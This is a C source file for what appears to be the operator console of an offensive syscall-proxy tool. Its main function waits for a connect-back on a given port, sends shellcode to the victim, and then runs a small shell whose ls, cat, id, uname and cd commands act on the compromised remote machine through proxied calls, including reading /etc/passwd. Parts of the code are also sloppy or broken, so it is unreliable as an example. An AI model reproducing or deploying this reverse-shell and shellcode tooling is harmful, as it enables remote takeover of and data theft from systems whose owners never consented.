#include <stdio.h>
#include <getopt.h>
#include <time.h>
#include "libsp/libsp.h"

#define ARRAY_SIZE(x) (sizeof(x)/sizeof(x[0]))

typedef void (*cmd_exec_t)(int argc, char **argv);
struct cmd {
	char *cmd_name;
	cmd_exec_t cmd_exec;
};

static char prompt[128] = "$";
static char login[64];
static char host[64];
static char pwd[256];

void get_prompt(char *prompt, int len)
{
	int fd;
	char *file_buf;
	uid_t uid;
	struct stat st;
	struct utsname utsn;

	sp_uname(&utsn);
	uid = sp_getuid();
	sprintf(login, "%d", uid);

	fd = sp_open("/etc/passwd", O_RDONLY);
	if (fd < 0)
		goto out;
		
	sp_fstat(fd, &st);
	file_buf = malloc(st.st_size);

	sp_read(fd, file_buf, st.st_size);

	while (file_buf) {
		if (!strchr(file_buf, '\n'))
			break;
		file_buf = strchr(file_buf, '\n') + 1;
	}

	strncpy(host, utsn.nodename, sizeof(host) - 1);
out:
	sp_close(fd);
}

void update_prompt(void)
{
	char uid_chr;

	if (sp_getuid())
		uid_chr = '$';
	else
		uid_chr = '#';
	snprintf(prompt, sizeof(prompt), "[%s@%s %s]%c", login, host, pwd, uid_chr);
}

void builtin_exit(int argc, char **argv)
{
	exit(0);
}

void builtin_cd(int argc, char **argv)
{
	int err;
	char *dir = argc > 1 ? argv[1] : "/";

	if (!argc)
		err = sp_chdir(dir);
	else
		err = sp_chdir(dir);

	if (err < 0) {
		fprintf(stderr, "cd: %s: No such file or directory", dir);
		return;
	}

	strncpy(pwd, dir, sizeof(pwd) - 1);
	update_prompt();		
}

void builtin_id(int argc, char **argv)
{
	uid_t uid, euid;
	gid_t gid, egid;

	uid = sp_getuid();
	euid = sp_geteuid();
	gid = sp_getgid();
	egid = sp_getegid();

	printf("uid=%d", uid);
	if (euid != uid)
		printf(" euid=%d", euid);
	printf(" gid=%d", gid);
	if (egid != gid)
		printf(" egid=%d", egid);
	printf("\n");
}

void builtin_ls(int argc, char **argv)
{
	char c;
	int ret, dir_fd, opt_stat, opt_hidden;
	struct dirent dir;
	char *dir_path;

	opt_stat = opt_hidden = 0;
	for (;;) {
		c = getopt(argc, argv, "la");
		if (c == -1)
			break;
		switch (c) {
		case 'l':
			opt_stat = 1;
			break;
		case 'a':
			opt_hidden = 1;
			break;
		default:
			;
		}
	}
 	dir_path = optind >= argc ? pwd : argv[optind];

	dir_fd = sp_open(dir_path, O_RDONLY);
	if (dir_fd < 0) {
		fprintf(stderr, "ls: %s: No such file or directory\n", dir_path);
		goto out;
	}

	for (;;) {
		ret = sp_readdir(dir_fd, &dir, 0);
		if (ret <= 0)
			break;

		if (!opt_hidden && dir.d_name[0] == '.')
			continue;

		if (opt_stat) {
			struct stat st;
			char path[1024];
			char mod[11];
			char *tm;

			snprintf(path, sizeof(path), "%s/%s", dir_path, dir.d_name);
			ret = sp_lstat(path, &st);
			if (ret < 0) {
				fprintf(stderr, "Unable to stat %s\n", path);
				continue;
			}

			if (S_ISDIR(st.st_mode))
				mod[0] = 'd';
			else if (S_ISCHR(st.st_mode))
				mod[0] = 'c';
			else if (S_ISBLK(st.st_mode))
				mod[0] = 'b';
			else if (S_ISFIFO(st.st_mode))
				mod[0] = 'f';
			else if (S_ISLNK(st.st_mode))
				mod[0] = 'l';
			else if (S_ISSOCK(st.st_mode))
				mod[0] = 's';
			else
				mod[0] = '-';

			mod[1] = st.st_mode & S_IRUSR ? 'r' : '-';
			mod[2] = st.st_mode & S_IWUSR ? 'w' : '-';
			mod[3] = st.st_mode & S_IXUSR ? 'x' : '-';
			mod[4] = st.st_mode & S_IRGRP ? 'r' : '-';
			mod[5] = st.st_mode & S_IWGRP ? 'w' : '-';
			mod[6] = st.st_mode & S_IXGRP ? 'x' : '-';
			mod[7] = st.st_mode & S_IROTH ? 'r' : '-';
			mod[8] = st.st_mode & S_IWOTH ? 'w' : '-';
			mod[9] = st.st_mode & S_IXOTH ? 'x' : '-';
			mod[10] = 0;
			tm = ctime(&st.st_mtime);
			*strchr(tm, '\n') = 0;
			printf("%s\t%d %d\t%lu\t%s %s\n",
				mod, st.st_uid, st.st_gid, st.st_size, tm, dir.d_name);
		} else {
			printf("%s\n", dir.d_name);
		}
	}
	sp_close(dir_fd);
out:
	optind = 0;
	return;
}

void builtin_cat(int argc, char **argv)
{
	char buf[256];
	int i, r, fd;
	struct stat st;

	for (i = 1; i < argc; i++) {
		fd = sp_open(argv[i], O_RDONLY);
		if (fd < 0) {
			fprintf(stderr, "cat: %s: No such file or directory\n", argv[i]);
			continue;
		}

		sp_fstat(fd, &st);
		if (S_ISDIR(st.st_mode)) {
			fprintf(stderr, "cat: %s: Is a directory\n", argv[i]);
			continue;
		}

		for (;;) {
			r = sp_read(fd, buf, sizeof(buf));
			if (r <= 0)
				break;
			write(1, buf, r);
		}
	}
}

void builtin_uname(int argc, char **argv)
{
	struct utsname utsn;

	sp_uname(&utsn);
	printf("%s %s %s %s %s\n", utsn.sysname, utsn.nodename,
				   utsn.release, utsn.version, utsn.machine);
}

struct cmd cmds[] = {
	{
		.cmd_name = "exit",
		.cmd_exec = builtin_exit,
	},
	{
		.cmd_name = "cd",
		.cmd_exec = builtin_cd,
	},
	{
		.cmd_name = "id",
		.cmd_exec = builtin_id,
	},
	{
		.cmd_name = "ls",
		.cmd_exec = builtin_ls,
	},
	{
		.cmd_name = "cat",
		.cmd_exec = builtin_cat,
	},
	{
		.cmd_name = "uname",
		.cmd_exec = builtin_uname,
	},
};

cmd_exec_t get_cmd_exec(const char *name)
{
	int i;

	for (i = 0; i < ARRAY_SIZE(cmds); i++)
		if (!strcmp(cmds[i].cmd_name, name))
			return cmds[i].cmd_exec;

	return NULL;
}

void shell(void)
{
	char cmd[256], *newline;
	cmd_exec_t cmd_exec;
	int argc;
	char *argv[128];
	char *saveptr, *c;

	setvbuf(stdout, NULL, _IONBF, 0);
	
	get_prompt(prompt, ARRAY_SIZE(prompt));
	update_prompt();

	for (;;) {
		printf("%s ", prompt);
		if (!fgets(cmd, sizeof(cmd), stdin))
			break;

		if (cmd[0] == '\n')
			continue;

		newline = strchr(cmd, '\n');
		if (newline)
			*newline = '\0';

		c = cmd;
		for (argc = 0; argc < ARRAY_SIZE(argv); argc++) {
			argv[argc] = strtok_r(c, " ", &saveptr);
			if (!argv[argc])
				break;
			c = NULL;
		}
		
		cmd_exec = get_cmd_exec(argv[0]);
		if (cmd_exec)
			cmd_exec(argc, argv);
		else
			fprintf(stderr, "%s : no such command\n", cmd);
	}
}

int main(int argc, char **argv)
{
	int port;

	if (argc < 2) {
		printf("usage : %s <port>\n", argv[0]);
		exit(1);
	}
	port = atoi(argv[1]);

	printf("[*] Waiting connect back on port %d\n", port);
	wait_connect_back(port);
	send_sp_shellcode(0, 0);

	strcpy(pwd, "/");
	sp_chdir(pwd);

	printf("[*] Shell : type help for available command\n");
	shell();

	return 0;
}
